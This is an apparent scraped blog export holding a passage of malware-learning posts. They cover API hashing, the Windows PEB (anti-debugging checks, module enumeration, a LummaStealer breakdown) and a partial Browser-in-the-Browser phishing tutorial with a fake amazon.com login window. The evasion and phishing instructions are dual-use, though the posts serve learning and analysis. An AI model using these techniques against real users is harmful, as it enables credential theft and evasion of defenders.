printf(\u0026#34;[!] Couldn\u0026#39;t Find Address Of Specified Function \\n\u0026#34;); return -1; } // Calling MessageBoxA pMessageBoxA(NULL, \u0026#34;Avoiding names - executing functions\u0026#34;, \u0026#34;:)\u0026#34;, MB_OK | MB_ICONEXCLAMATION); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Quit ... \u0026#34;); getchar(); return 0; } Executing the code outputs the following:\nWhat\u0026rsquo;s next Here we just made 2/3 custom functions:\nGetModuleHandleH GetProcAddressH In the future we will see how to make a custom LoadLibraryH function to apply another API Hashing layer instead of loading the DLL with its plain name.\nReferences\n[1] Read Team Notes: Windows API Hashing in Malware\r[2] Max Kersten: API Hashing\r[3] Christophe Tafani-Dereeper: Hiding in Plain Sight: Unlinking Malicious DLLs from the PEB\r[3] WireDiver: Windows PEB parsing – A binary with no imports\r[4] GB_MASTER: ON THE ROAD OF HIDING… PEB, PE FORMAT HANDLING AND DLL LOADING HOMEMADE APIS – PART 2\r","permalink":"http://localhost:1313/posts/apihashing/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eAs mentioned in the \u003cb\u003e\u003ci\u003eExploring PEB struct and its fields\u003c/i\u003e\u003c/b\u003e post, we will now see how to to use a technique known as API Hashing. API hashing is a technique used in malware to identify API functions by their hash value from their names or other attributes. This hash value can then be used instead of the function names or other attributes to enumerate, rehash, compare and use functions based on the hash value. This way, direct calls by function names is avoided and thus leads to fewer detection rates. More specifically, it is used to make the work of analysts harder since names of WINAPI functions or DLL\u0026rsquo;s won\u0026rsquo;t show in string commands or tools like CFF Explorer, so the intentions of the executable won\u0026rsquo;t be so clear from the beginning.\u003c/p\u003e","title":"API Hashing - Extensive breakdown"},{"content":"Intro This is the first post of the malware series that me and my friend @r4sti will be starting. We basically started learning malware concepts, dev and windows internals, and I will keep track of what we learn - like the rest of the things in this blog:)\nSpecial thanks to him cause he is basically teaching me 70% of this stuff lol.\nSo in this post, we will dive into:\nWhat is PEB Theory compared to a real world sample Code examples IsBeingDebugged Loaded DLLs PEB in depth - x64dbg How it can be abused (dll-unlinking) What is PEB The Process Environment Block (PEB) is a vital structure in the Windows operating system, residing in user-mode memory and accessible by the corresponding process.\nAlthough primarily intended for use by the operating system, the PEB contains a wealth of information about the running process. This includes data on whether the process is being debugged, details on the modules loaded into memory, and the command line used to invoke the process. Due to the critical nature of this information, adversaries have several opportunities to exploit the PEB for malicious purposes.\nThe PEB structure based on microsoft, has the following struct:\ntypedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId; } PEB, *PPEB; but truth is, there is a bigger, undocumented struct of PEB, which contains a lot more information about this Windows structure. Based on the NTAPI undocumented functions, the full structure of PEB is the following:\ntypedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID SubSystemData; PVOID ProcessHeap; PVOID FastPebLock; PPEBLOCKROUTINE FastPebLockRoutine; PPEBLOCKROUTINE FastPebUnlockRoutine; ULONG EnvironmentUpdateCount; PPVOID KernelCallbackTable; PVOID EventLogSection; PVOID EventLog; PPEB_FREE_BLOCK FreeList; ULONG TlsExpansionCounter; PVOID TlsBitmap; ULONG TlsBitmapBits[0x2]; PVOID ReadOnlySharedMemoryBase; PVOID ReadOnlySharedMemoryHeap; PPVOID ReadOnlyStaticServerData; PVOID AnsiCodePageData; PVOID OemCodePageData; PVOID UnicodeCaseTableData; ULONG NumberOfProcessors; ULONG NtGlobalFlag; BYTE Spare2[0x4]; LARGE_INTEGER CriticalSectionTimeout; ULONG HeapSegmentReserve; ULONG HeapSegmentCommit; ULONG HeapDeCommitTotalFreeThreshold; ULONG HeapDeCommitFreeBlockThreshold; ULONG NumberOfHeaps; ULONG MaximumNumberOfHeaps; PPVOID *ProcessHeaps; PVOID GdiSharedHandleTable; PVOID ProcessStarterHelper; PVOID GdiDCAttributeList; PVOID LoaderLock; ULONG OSMajorVersion; ULONG OSMinorVersion; ULONG OSBuildNumber; ULONG OSPlatformId; ULONG ImageSubSystem; ULONG ImageSubSystemMajorVersion; ULONG ImageSubSystemMinorVersion; ULONG GdiHandleBuffer[0x22]; ULONG PostProcessInitRoutine; ULONG TlsExpansionBitmap; BYTE TlsExpansionBitmapBits[0x80]; ULONG SessionId; } PEB, *PPEB; Theory compared to a real world sample What helped us get a better grasp of PEB\u0026rsquo;s fields and how useful this struct can become from a threat actors perspective, is the analysis of LummaStealer.\nI will input below the part of LummaStealer that utilizes PEB and will break it down part by part:\nOn the left we have the original assembly and on the right we have the same part of the code but renamed. We will observe why these parts have been modified as such.\nWe need to start from the main part of the assembly, which is the following:\nLine 1. mov eax, large fs:30h\t; eax = start of PEB structure Line 2. mov eax, [eax+0x0c]\t; eax = Ldr (pointer to PEB_LDR_DATA) Line 3. mov esi, [eax+0x10]\t; esi = pointer to the head of the doubly linked list InLoadOrderModuleList (this is a pointer to the first LDR_MODULE) Line 4. mov esi, [esi]\t; esi = stores the first LDR_MODULE Line 5. cmp dword ptr [esi+0x18], 0\t; esi+0x18 is the BaseAddress field Line 1: In line 1 the malware loads the address of the PEB structure by utilizing the fs:30h segment. It uses the fs segment because the code was written for x32 bit architecture. If it was written for x64 bit architecture, it would use the gs:60h segment.\nLine 2: In line 2 it loads the Ldr field from the PEB structure. We can see that it uses [eax+0x0c] to do so (remember that eax has the fs:30h loaded to it, or in other words the PEB struct). To understand why [eax+0x0c] ( or basically PEB[0x0c] ) is landing on the Ldr field, we must observe what exists on the 0x0c offset of the PEB structure:\ntypedef struct _PEB { BYTE\tReserved1[2];\t// offset = 0x00 --\u0026gt; it stores 2 bytes BYTE BeingDebugged;\t// offset = 0x02 --\u0026gt; it stores 1 byte BYTE Reserved2[1];\t// offset = 0x03 --\u0026gt; it stores 1 byte PVOID Reserved3[2];\t// offset = 0x04 --\u0026gt; it stores 2*4 bytes (PVOID is 4 bytes) PPEB_LDR_DATA Ldr;\t// offset = 0x0c ... Line 3: From the previous code section, we saw that the malware loaded Ldr by using the offset 0x0c. Then, the line mov edi, [eax + 10h] has been renamed to mov edi, [eax + PEB_LDR_DATA.InLoadOrderModuleList.Blink]. Why is that? Well, eax was previously set to Ldr (mov eax, [eax+0x0c]), and we added the offset 10h (mov esi, [eax+0x10]). So let\u0026rsquo;s simply view the PEB_LDR_DATA struct and see what exists in the 0x10 offset:\ntypedef struct _PEB_LDR_DATA { DWORD Length; // offset = 0x00 BYTE Initialized[4]; // offset = 0x04 void* SsHandle; // offset = 0x08 LIST_ENTRY InLoadOrderModuleList; // offset = 0x0c `----\u0026gt; _LIST_ENTRY *Flink; // offset = 0x0c `----\u0026gt; _LIST_ENTRY *Blink; // offset = 0x10 LIST_ENTRY InMemoryOrderModuleList; // offset = 0x14 LIST_ENTRY InInitializationOrderModuleList; // offset = 0x1C void* EntryInProgress; // offset = 0x24 } PEB_LDR_DATA; Note\nPPEB_LDR_DATA is basically a Pointer to the PEB_LDR_DATA, that's why the PPEB_LDR_DATA Ldr points to the above struct.\nIn the _PEB_LDR_DATA struct I have added the contents of the LIST_ENTRY struct (it has two subfields).\nWe can see that the offset 0x10 is landing inside the InLoadOrderModuleList and specifically in the Blink field. But what is the InLoadOrderModuleList and its Blink and Flink fields\u0026hellip;??!!??\nWell, the InLoadOrderModuleList is a double linked list where its elements (Flink and Blink) are pointers to some LDR_MODULE (or as it is called today LDR_DATA_TABLE_ENTRY)\nTo put it simply, when an executable runs, the DLL\u0026rsquo;s it uses are stored in the LDR_MODULE struct. This stuct has the following fields:\ntypedef struct _LDR_MODULE { LIST_ENTRY InLoadOrderModuleList; // offset = 0x00 `----\u0026gt; _LIST_ENTRY *Flink; // offset = 0x00 `----\u0026gt; _LIST_ENTRY *Blink; // offset = 0x04 LIST_ENTRY InMemoryOrderModuleList; // offset = 0x08 LIST_ENTRY InInitializationOrderModuleList; // offset = 0x10 PVOID BaseAddress; // offset = 0x18 PVOID EntryPoint; // offset = 0x1c ULONG SizeOfImage; // offset = 0x20 UNICODE_STRING FullDllName; // offset = 0x28 UNICODE_STRING BaseDllName; // offset = 0x30 ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE, *PLDR_MODULE; All the elements of this list can be parsed with the help of InLoadOrderModuleList and specifically the Blink and Flink fields, which just point to the previous (B-ackwards) and next (F-orward) DLL List entry. A picture that perfectly depicts this is the following:\nNote\nThe first element of this list has no data section. It only has two pointers (Flink and Blink).\nThe first element of the list is the far left.\nLine 4: So at this point, the malware just loaded LDR through PEB and the esi register (mov esi, [esi]) contains the Blink of the List Head that points to the last LDR_MODULE. By dereferencing esi ([esi]), esi will basically \u0026ldquo;execute\u0026rdquo; the pointing to the previous LDR_MODULE. Now, we have landed on the previous LDR_MODULE and specifically on the Flink field. Why?\nBy dereferencing esi, we are now refering on the offset 0x00 - the start of where the esi is pointing. But since esi is pointing to the previous LDR_MODULE on offset 0x00, by looking at the LDR_MODULE struct, we see that the offset 0x00 is the InLoadOrderModuleList and specifically the Flink field since it is the first of the InLoadOrderModuleList's subfields (so they have the same offset).\nLine 5: Looking at the LDR_MODULE struct once again, at offset 0x18 we see the BaseAddress field (or DllBase). The check for the BaseAddress is made to make sure no errors have occur and the program won\u0026rsquo;t crash because of perhaps some invalid entry.\nSo, in order to locate the KERNEL32.DLL, the code loops through all modules of the InLoadOrderModuleList with the help of the Flink and Blink pointers. Every time in the loop, it moves to the next module of the list, storing the Flink pointer that points to the next element of the list.\nFor each module, it loads its BaseDllName (push dword ptr [esi+30h]) and it checks if it is the KERNEL32.DLL.\nMoving forward, esi (since it is now a Double linked list) will eventually end up back in the List Head, which is stored in the edi register. That is why in the code the cmp edi, esi is the loop termination condition.\nFinally, after the loop, it takes the base address of the DLL and a hash, where it proceeds to do API hashing.\nCode examples Now that we have reviewed the part of the malware that utilized PEB and we have become familiar with it, let\u0026rsquo;s start writting some code examples in C and play around with PEB.\nCode example 1 - IsBeingDebugged In this chapter we will write a simple script that uses PEB\u0026rsquo;s isBeingDebugged field to try and see if our running executable is loaded into a debugger or not.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; int main(int argc, wchar_t* argv[]) { PPEB pPEB = (PPEB)__readgsqword(0x60); // First way: Point to field with -\u0026gt; BYTE being_debugged = pPEB-\u0026gt;BeingDebugged; printf(\u0026#34;IsBeingDebugged: %d\\n\u0026#34;, being_debugged); // Second way: Point to field with offset DWORD flag = *(PBYTE)((PBYTE)pPEB + 0x02); // we could also use BYTE instead of DWORD printf(\u0026#34;IsBeingDebugged: %d\\n\u0026#34;, flag); return 0; } Here we see two way different ways of getting the IsBeingDebugged field. Let\u0026rsquo;s break them down!\nReading the PEB Starting off, we read the PEB struct by using the __readgsqword(0x60) since the system is a x64 one. We then cast the result to (PPEB) type which is basically a pointer that points to the PEB struct.\nFirst method The first method that I personally find the easiest is by using the \u0026lsquo;-\u0026gt;\u0026rsquo; symbol. This way we basically use a struct and point (-\u0026gt;) to the field within it:\nPPEB pPEB = (PPEB)__readgsqword(0x60); // read PEB BYTE being_debugged = pPEB-\u0026gt;BeingDebugged; // point to the field within the PEB struct printf(\u0026#34;IsBeingDebugged: %d\\n\u0026#34;, being_debugged); // print whether the exe is being debugged Second method The second method is a bit trickier since we have to calculate the offset from the struct based on the data types and the size they fill in memory. After we calculate the correct offset, we just do the correct byte casting and print the result:\nPPEB pPEB = (PPEB)__readgsqword(0x60); // read PEB DWORD flag = *(PBYTE)((PBYTE)pPEB + 0x02); // point to the field within the PEB struct printf(\u0026#34;IsBeingDebugged with offset pointer: %d\\n\u0026#34;, flag); // print whether the exe is being debugged In more details, the pPEB is a pointer to the PEB struct. By casting to (PBYTE)pPEB, we can now treat the address of the PEB struct as a sequence of bytes rather than a specific struct.\nSo, by doing (PBYTE)pPEB + 0x02 we are now pointing to the byte sequence at offset 0x02.\nFinally, we use the outer *(PBYTE) to dereference the previous byte address and access the actual bytes inside the address.\nRunning the code After running the code in visual studio, we see that the returned value is 0 (False), which means that our executable was not being debugged:\nHowever, if we run it again using the Local Windows Debugger in VS code, both our methods return 1 (True), which means our executable successfully recognized it was being debugged:\nWe will later see this in x64dbg were we will dive deeper into other PEB struct fields.\nCode example 2 - Loaded DLLs Although in the previous example we had direct access to the IsBeingDebugged field of the PEB structure, this will not always be the case. Often times, we will not have direct access to all fields of a struct and thus we will have to define it ourselfs in order to get the desired data.\nIn this code example, we will see how to land on the LDR struct that exists inside the PEB struct and get the list of loaded modules that our executable is using. The code that does this is the following:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026#34;Windows.h\u0026#34; #include \u0026#34;winternl.h\u0026#34; typedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; typedef struct _LDR_MODULE_full { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE_full, * PLDR_MODULE_full; int main(int argc, wchar_t* argv[]) { #ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; // Access the InLoadOrderModuleList LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; // Traverse the InLoadOrderModuleList and print the BaseAddress and BaseDllName of each module while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } return 0; } Reading the PEB and its Ldr field Let\u0026rsquo;s break down the code. Starting off, we have the following lines of code:\n#ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; Basically, our code checks whether the system is a 64 bit system or a 32 bit system in order to know how to read the PEB struct. You can tell from the way it reads it:\n__readgsqword(0x60) \u0026ndash;\u0026gt; gsqword and 0x60 offset \u0026ndash;\u0026gt; 64 bit system __readfsdword(0x30) \u0026ndash;\u0026gt; fsdword and 0x30 offset \u0026ndash;\u0026gt; 32 bit system After the code has recognized the system, it reads the Ldr field of the PEB struct. But wait a minute. Why do we cast the pLdr to a PPEB_LDR_DATA_full? Why didn\u0026rsquo;t we do the same in the IsBeingDebugged example?\nTurns out, some Windows structs are not fully documented and thus there are limitations by frameworks such as VS code as to what fields it identifies. So if we were to use the Microsoft\u0026rsquo;s PEB_LDR_DATA struct we would be able to read very limited fields. The PEB_LDR_DATA that Microsoft docs provide is the following:\ntypedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; While the full (undocumented) LDR struct is the following:\ntypedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; And thus this is the one we are using since we later on in the code try to read the InLoadOrderModuleList. Now this explains the one of the two self defined structs we have written in our code.\nTo summarise before continuing, the code:\nreads the PEB field depending on the system\u0026rsquo;s architecture. defines the full LDR struct and proceeds to read and store it in the pLdr variable, which is a pointer pointing at that struct (and all its fields). Reading Ldr-\u0026gt;InLoadOrderModuleList\u0026rsquo;s fields Continuing on, we have these two lines of code:\n// Access the InLoadOrderModuleList LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; After our previous read of the LDR struct, we now try and read its InLoadOrderModuleList\u0026rsquo;s subfields, the Flink and Blink. Why? Well, as we descriped earlier on, the InLoadOrderModuleList contains a list of modules that our executable loads on runtime. This is a double linked list and we can move to the next or previous module (DLL) by using the Flink (Forward) and Blink (Backward) subfields. So this is the reason we read these fields in these lines. More specifically, we:\nUse the arrow pointing method, which is more easy to use. For the Blink field, we use the \u0026lsquo;\u0026amp;\u0026rsquo; address symbol for the reason described in the LummaStealer analysis section. As a small reminder, the pListEntry points to the first module in the InLoadOrderModuleList while the pListHead (that uses the \u0026lsquo;\u0026amp;\u0026rsquo; address symbol) points to the head of the list which does not contain any DLL\u0026rsquo;s. It is simply the start of the list as shown in previous pictures. If we were to dereference this address (with a \u0026lsquo;*\u0026rsquo;) then the pListHead would actually use the Flink (which at this point just has its address) and would point to the first DLL loaded in the list - which is exactly what the pListEntry points at. So we just keep its address for the loop comparison instead of the actual DLL it points at. Another reason we need to read the ListEntry and the ListHead is for the following loop, in order to know when we will eventually do a circle and land again on the ListHead.\nLooping through all loaded DLL\u0026rsquo;s After we have successfully located the ListEntry and ListHead, we will start to loop through the list and print each DLL and its address:\n// Traverse the InLoadOrderModuleList and print the BaseAddress and BaseDllName of each module while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } We can see at the end of the loop that the ListEntry changes to the next loaded DLL by doing pListEntry-\u0026gt;Flink - basically using Flink to go to the next DLL. The loop runs until the pListEntry matches the pListHead we stored previously. This means we have completed the looping of the list and there are no more DLL\u0026rsquo;s loaded in it.\nLastly, the way we load each DLL is by using the CONTAINING_RECORD macro definition. The full definition of this macro is the following:\n#define CONTAINING_RECORD(address, type, field) ((type *)((PCHAR)(address) - (ULONG_PTR)(\u0026amp;((type *)0)-\u0026gt;field))) address: This is the address of the field within the structure. So by using the pListEntry, we pass the pointed to the address of the loaded DLL at that time. type: This is the type of the parent structure. Here we passed the LDR_MODULE_full since this is the parent structure that contains the InLoadOrderModuleList subfield that we use to load the DLL\u0026rsquo;s. field: This is the subfield we want to use from the parent structure. Here we used the InLoadOrderModuleList since this is the one we utilized to load the DLL\u0026rsquo;s. Basically, pListEntry points to a LIST_ENTRY structure (Flink of the current entry). The macro calculates the address of the LDR_MODULE_full structure by subtracting the offset of the InLoadOrderModuleList field from pListEntry. This gives us a pointer to the LDR_MODULE_full structure containing the LIST_ENTRY. So pListEntry is nothing more than a list element pointing to a DLL - it is not the actual DLL. That\u0026rsquo;s why we use CONTAINING_MACRO, to get the actual full DLL struct and then cast to PLDR_MODULE_full, since that\u0026rsquo;s what is returned to us.\nPrinting the addresses and DLL\u0026rsquo;s Last but not least, the following two lines handle the printing of the DLL\u0026rsquo;s address and name:\nprintf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); The first print statement just uses %p to print the base address to which the pointer is pointing at.\nThe second print statement is a bit more complex. Let\u0026rsquo;s break it down:\nwprintf: This print statement is used for wide-character strings (wchar_t). So the preceding w stands for wide. L\u0026quot;BaseDllName: %wZ\\n\u0026quot;: The L prefix tells the compiler that the string that is about to be print should be treated as a wide-character string (wchar_t). The %wZ when used with wprintf tells the function to format the string as a wide-character string. It is basically a placeholder for wchar_t type strings (wide-character strings). After running the full code we broke down, we will get the following results:\nBaseAddress: 00007FF76D220000\rBaseDllName: isBeingDebugged.exe\rBaseAddress: 00007FF9AB6B0000\rBaseDllName: ntdll.dll\rBaseAddress: 00007FF9A97A0000\rBaseDllName: KERNEL32.DLL\rBaseAddress: 00007FF9A8ED0000\rBaseDllName: KERNELBASE.dll\rBaseAddress: 00007FF998190000\rBaseDllName: VCRUNTIME140D.dll\rBaseAddress: 00007FF9850A0000\rBaseDllName: ucrtbased.dll In the following section, we will see the same executable in x64dbg and see in action how all these fields show up in a debugger and how to identify them:)\nPEB in depth - x64dbg Now that we have a fully working executable that enumerates the InLoadModuleList to get the DLLs, let\u0026rsquo;s load it in x64dbg and see the relevant fields while debugging the exe.\nWe first need to uncheck the System Breakpoint by going to Options-\u0026gt;References:\nThe reason is that the x64dbg would land on the ntdll if we had a system breakpoint checked. For more information regarding this, advise this video from OALABS.\nAfter that, when we load the executable the debugging will start on the target. We then need to locate the invoke main instruction:\nGoing through the instructions, eventually we will find the PEB struct (gs:60h):\nTo go into the full struct, we need to either follow the address loaded to rax (since the PEB is moved to the rax register) or just use CTRL+G and write \u0026ldquo;peb()\u0026rdquo;. Both these are equal and will give/land us to the base address of the PEB:\nPEB BaseAddress After we have landed on the base address of the PEB struct, we need to follow this address in the memory dump. We can do this by write clicking\u0026ndash;\u0026gt;Follow in Dump\u0026ndash;\u0026gt;Selected Address. This will lead us to the PEB address, and in the following image we can see some of the most important fields of PEB:\nAs a reference, here is the relevant fields in the PEB struct:\ntypedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; -- more -- } The underlined addresses are of Pointer type. Pointers can also not be underlined if they point to a null reference.\nImageBaseAddress To land for example in the ImageBaseAddress field - the green address - we just need to highlight the corresponding address (0x00007FF710330000 (big endian)), right click on it and chose Follow QWORD Map-\u0026gt;Dump 2. This will show the MZ header which means it has landed on the exe itself:\nLdr To land on the Ldr struct, we need to follow the second pointer highlighted in blue with address 0x00007FF9AB81C4. As previously, follow the QWORD in Dump 3. You should see something like the following:\nOffset\rAddress\rField\rSubfield\rValue\r0x00\r0x7FF9AB81C4D0\rInLoadOrderModuleList\rFlink\r0x000001DEC5D82D40\r0x08\rBlink\r0x000001DEC5D8DE30\r0x10\r0x7FF9AB81C4E0\rInMemoryOrderModuleList\rFlink\r0x000001DEC5D82D50\r0x18\rBlink\r0x000001DEC5D8DE40\r0x20\r0x7FF9AB81C4EF\rInInitializationOrderModuleList\rFlink\r0x000001DEC5D828D0\r0x28\rBlink\r0x000001DEC5D8DC00\rWe will only analyze the InLoadOrderModuleList since the rest of the lists follow the same logic. Also, the List Head is contained in these lists.\nFlink and Blink Pointers of the List Head Let\u0026rsquo;s follow the Flink Pointer of InLoaderModuleList in the address 0x000001DEC5D82D40 (see the previous table):\nThe InLoadMemoryOrderLinks, InMemoryOrderLinks, InInitializationOrderLinks are of type LIST_ENTRY and they contain just two pointers, a Flink that points to the next element of the list, and a Blink pointing to the previous element of the list.\nIf we take the address of DllBase (0x00003310F77F0000) in Memory Map of x64dbg, we see that the current element of the LDR_MODULE struct (since we previously followed the flink pointer of InLoadOderModuleList) is actually our executable:\nThe 8 bytes that follow are the entry point of the exe.\nIf we follow the same process and follow the Flink Pointer of the current module (our exe), it will lead to the next element (module) of the list, which if we follow as previously the DllBase, we will see its the ntdll.\nIn the same memory map we see these modules, we can actually see the order they have been loaded:\nIn an image @r4sti painted, we can see the logic behind these Flinks we followed:\nThe same idea is applied for the Blink pointer. This would result in us landing in the previous ldr module, where - if you can guess based on the previous image - will be the ucrtbased.dll:\nWhat\u0026rsquo;s next After we got a grasp of the structures and how to enumerate modules, me and r4sti thought API Hashing would be a good next topic to study. So in the next post I\u0026rsquo;ll share what we learned about how to avoid using direct API DLL names and solely use them by their hash.\nReferences\n[1] Ariel Silver, Automation Engineer: Defense Evasion Techniques – PEB Edition\r[2] GB_MASTER: WRITTEN BY GB_MASTER FEBRUARY 26, 2012 ON THE ROAD OF HIDING… PEB, PE FORMAT HANDLING AND DLL LOADING HOMEMADE APIS – PART 1\r[3] hackingump: PEB: Where Magic Is Stored\r[4] Mohamed Fakroud: Digging into Windows PEB\r","permalink":"http://localhost:1313/posts/peb/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis is the first post of the malware series that me and my friend @r4sti will be starting. We basically started learning malware concepts, dev and windows internals, and I will keep track of what we learn - like the rest of the things in this blog:)\u003cbr\u003e\n\u003csmall\u003e\u003ci\u003eSpecial thanks to him cause he is basically teaching me 70% of this stuff lol.\u003c/i\u003e\u003c/small\u003e\u003c/p\u003e\n\u003cp\u003eSo in this post, we will dive into:\u003c/p\u003e","title":"Exploring PEB struct and its fields"},{"content":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\nHow does it work The way this attack works is that you host a phishing website, provide a login/signup page with usual platforms like \u0026ldquo;Continue with email\u0026rdquo;, \u0026ldquo;Continue with Facebook\u0026rdquo; etc and make the SSO window look legitimate (valid url) but the reality is that we will have control over that window to, because that window is fake as well.\nDemo To start off, we need to go to mr.d0x github page and get the template windows for this attack:\nhttps://github.com/mrd0x/BITB The files are just usual website files (html, css, js, icons). Example of a window before we modify it is the following: In the github repo, there are multiple templates based on the browser and the theme (dark / light). You need to know how the victim has configured his/her browser in order to use the right template so evade suspicions. You can either take a guess based on statistics (what is the most used theme) or write further code in the website to detect the theme and thus use the appropriate theme:\nhttps://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers Now that we have chosen a theme, let\u0026rsquo;s host a phishing website. I will go with blackeye one since I have made a post about it.\nWe first fire up our phishing website. It\u0026rsquo;s going to be an amazon one:\nAfterwards, we need to find the appropriate amazon.svg file and place it in the theme folder we are using. The final html page should be something like the following:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;window\u0026#34;\u0026gt; \u0026lt;!-- Title bar start --\u0026gt; \u0026lt;div id=\u0026#34;title-bar-width\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;title-bar\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;margin-top:5px;\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./amazon.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;15px\u0026#34; id=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;logo-description\u0026#34;\u0026gt;Please log to your account.\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span id=\u0026#34;minimize\u0026#34;\u0026gt;\u0026amp;#8212;\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;square\u0026#34;\u0026gt;□\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;exit\u0026#34;\u0026gt;✕\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;url-bar\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./ssl.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;20px\u0026#34; id=\u0026#34;ssl-padlock\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;domain-name\u0026#34;\u0026gt;https://www.amazon.com\u0026lt;/span\u0026gt; \u0026lt;span 